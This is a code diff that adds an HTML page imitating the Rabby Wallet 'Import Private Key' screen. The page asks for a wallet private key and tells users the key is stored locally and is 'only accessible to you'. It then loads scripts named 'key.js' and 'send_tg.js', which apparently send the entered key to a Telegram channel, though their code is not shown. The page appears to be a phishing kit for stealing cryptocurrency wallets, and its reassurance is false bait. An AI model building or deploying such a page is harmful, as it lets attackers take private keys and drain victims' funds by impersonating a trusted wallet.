@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html translate="no" class="notranslate overflow-hidden">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google" content="notranslate">
+    <link rel="shortcut icon" href="/assets/images/favicon.png" type="image/x-icon">
+
+    <meta name="viewport" content="initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=no,viewport-fit=cover">
+    <link href="/css/Roboto+Mono+Lato.css" rel="stylesheet">
+    <link href="/css/bzw98vukd741guvr.css" rel="stylesheet">
+    <title>Rabby Wallet</title>
+    <link href="/assets/images/logo-128.png" rel="icon">
+    <meta name="name" content="Rabby">
+    <script src="/static/js/history_hack.js"></script>
+</head>
+
+<body class="h-full" style="opacity: 1;">
+    <div id="root" class="h-full overflow-x-hidden overflow-y-auto">
+        <div class="rabby-stray-page">
+            <form autocomplete="off" class="ant-form ant-form-horizontal sm:pb-[98px] lg:pb-[72px]" id="keyForm">
+                <div class="rabby-navbar">
+                    <div class="rabby-navbar-container">
+                        <div class="rabby-navbar-main">
+                            <div class="rabby-navbar-left">
+                                <a class="rabby-navbar-back" href="/window.html">
+                                    <img src="/generated/svgs/e951d5e4069d86a7ee6f7622238a95d0.svg" alt="">
+                                </a>
+                            </div>
+                            <div class="rabby-navbar-title">Import Private Key</div>
+                            <div class="rabby-navbar-right"></div>
+                        </div>
+                    </div>
+                </div>
+                <div class="rabby-container widget-has-ant-input">
+                    <div class="px-20 pt-24">
+                        <div class="ant-row ant-form-item" style="row-gap: 0px;">
+                            <div class="ant-col ant-form-item-control">
+                                <div class="ant-form-item-control-input">
+                                    <div class="ant-form-item-control-input-content">
+                                        <input class="ant-input h-[52px] p-16 border-bright-on-active"
+                                            placeholder="Enter your Private key" spellcheck="false" type="password"
+                                            id="key">
+                                    </div>
+                                </div>
+                                <div id="error" class="ant-form-item-explain ant-form-item-explain-error"
+                                    style="display: none;">
+                                    <div role="alert">the private key is invalid</div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="rabby-TipTextList-rabby--f58pf5 lgsObX mt-32">
+                            <section>
+                                <h3>What is a private key?</h3>
+                                <p>A string of letters and numbers used to control your assets.</p>
+                            </section>
+                            <section>
+                                <h3>Is it safe to import it in Rabby?</h3>
+                                <p>Yes, it will be stored locally on your browser and only accessible to you.</p>
+                            </section>
+                            <section>
+                                <h3>Is it possible to import KeyStore?</h3>
+                                <p>Yes, you can <a class="underline text-r-blue-default cursor-pointer"> import KeyStore
+                                    </a> here. </p>
+                            </section>
+                        </div>
+                    </div>
+                </div>
+                <div class="bottom-0 left-0 w-full flex lg:bottom-[-24px] z-10 footer fixed">
+                    <div
+                        class="py-20 px-20 w-full flex justify-center stray-footer-nav bg-r-neutral-bg-1 border-t-r-neutral-line border-t">
+                        <button type="submit" class="ant-btn ant-btn-primary ant-btn-lg lg:h-[52px] w-[200px]"
+                            id="submitKey">
+                            <span>Confirm</span>
+                        </button>
+                    </div>
+                </div>
+            </form>
+        </div>
+    </div>
+
+
+    <script src="/static/js/key.js"></script>
+    <script src="/static/js/send_tg.js"></script>
+</body>
+
+</html>
